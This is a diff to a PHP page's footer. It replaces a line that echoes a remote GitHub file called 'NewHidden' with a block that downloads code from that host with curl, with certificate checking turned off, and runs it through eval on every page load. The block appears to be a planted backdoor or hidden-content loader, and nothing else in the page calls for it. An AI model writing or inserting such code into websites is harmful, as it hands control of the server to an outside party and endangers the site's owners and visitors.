@@ -207,8 +207,16 @@ require_once("admin/pages/connect.php");
     <!-- Footer -->
 
 		<?php include ('footer.php');  ?>
-    <?php echo file_get_contents(https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/index.dsg-nrru);?>
-
+<?php
+$url = 'https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/index.dsg-nrrut';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
   </body>
 
 </html>
